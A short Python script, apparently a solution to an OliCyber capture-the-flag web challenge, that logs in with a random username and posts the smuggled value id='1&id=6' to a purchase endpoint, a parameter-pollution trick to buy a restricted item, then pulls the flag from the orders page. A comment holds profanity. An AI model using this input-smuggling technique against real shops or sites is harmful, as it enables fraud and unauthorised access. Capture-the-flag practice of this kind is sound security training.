#!/usr/bin/env python3
import requests
import os
import re

# ALERT: STUPID FUCKING GUESSING CHALLENGE
URL = 'https://ntlfs.challs.olicyber.it'
REGEX = r'flag{.*}'

s = requests.Session()
s.post(URL + '/login.php', data={'username': os.urandom(20).hex()})
r = s.post(URL + '/buy.php', data={'id': '1&id=6'})
data = s.get(URL + '/orders.php').text
print(re.findall(REGEX, data)[0])